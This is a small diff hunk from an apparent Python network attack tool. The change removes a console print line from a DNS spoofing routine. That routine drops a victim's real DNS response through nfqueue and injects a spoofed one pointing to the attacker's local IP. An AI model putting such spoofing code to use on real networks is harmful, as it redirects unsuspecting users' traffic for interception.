@@ -133,7 +133,6 @@ class Parser():
 	def dnsspoof(self, dns_layer, IP_src, IP_dst, sport, dport, localIP, payload):
 		if args.dnsspoof:
 			if args.dnsspoof in dns_layer.qd.qname:
-				print G+'[+] DNS request for '+W+args.dnsspoof+G+' found; dropping packet and injecting spoofed one to '+W+localIP
 				logger.write('[+] DNS request for '+args.dnsspoof+' found; dropping packet and injecting spoofed one to '+localIP+'\n')
 				payload.set_verdict(nfqueue.NF_DROP)
 				print G+'[+] Dropped real DNS response. Injecting the spoofed packet sending victim to '+W+localIP
